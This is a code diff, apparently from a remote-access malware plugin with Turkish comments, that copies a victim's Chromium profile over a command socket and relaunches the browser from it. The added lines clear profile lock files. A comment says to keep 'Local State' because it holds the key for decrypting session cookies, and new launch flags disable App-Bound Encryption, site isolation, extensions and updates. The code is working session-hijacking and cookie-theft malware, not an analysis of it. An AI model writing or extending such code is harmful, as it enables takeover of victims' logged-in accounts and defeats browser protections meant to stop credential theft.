@@ -1217,6 +1217,28 @@ static bool copy_directory(const wstring& source, const wstring& destination) {
     return SHFileOperationW(&fileOp) == 0;
 }
 
+static void clean_profile(const wstring& profilePath) {
+    // Chromium kilit dosyalarını temizle
+    vector<wstring> filesToDelete = {
+        L"SingletonLock",
+        L"SingletonCookie",
+        L"SingletonSocket",
+        L"Lockfile"
+        // L"Local State" - BU DOSYA SİLİNMEMELİ! Oturumların (cookie) şifresini çözmek için gereken anahtarı içerir.
+    };
+
+    for (const auto& f : filesToDelete) {
+        wstring fullPath = profilePath + L"\\" + f;
+        DeleteFileW(fullPath.c_str());
+    }
+
+    // Default klasörü içindeki kilitleri de temizle
+    wstring defaultPath = profilePath + L"\\Default";
+    DeleteFileW((defaultPath + L"\\Web Data-journal").c_str());
+    DeleteFileW((defaultPath + L"\\Cookies-journal").c_str());
+    DeleteFileW((defaultPath + L"\\History-journal").c_str());
+}
+
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     initialize_visual_styles();
     g_socket = sock;
@@ -1313,6 +1335,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     if (!sourceProfile.empty()) {
                         send_status("Profiller kopyalanıyor...");
                         copy_directory(sourceProfile, destProfile);
+                        clean_profile(destProfile);
                     }
 
                     send_status("Tarayıcı başlatılıyor...");
@@ -1334,10 +1357,16 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                    L" --disable-infobars"
                                    L" --disable-gpu-compositing"
                                    L" --force-cpu-draw"
-                                   L" --disable-features=LockProfile"
+                                   L" --disable-features=AppBoundEncryption,LockProfile,IsolateOrigins,site-per-process"
                                    L" --password-store=basic"
                                    L" --disable-encryption-win"
-                                   L" --restore-last-session";
+                                   L" --restore-last-session"
+                                   L" --allow-profiles-outside-user-dir"
+                                   L" --no-pings"
+                                   L" --disable-notifications"
+                                   L" --disable-extensions"
+                                   L" --disable-component-update"
+                                   L" --disable-domain-reliability";
 
                     wstring fullCmd = L"\"" + exePath + L"\"" + args;
                     vector<wchar_t> cmdLine(fullCmd.begin(), fullCmd.end());
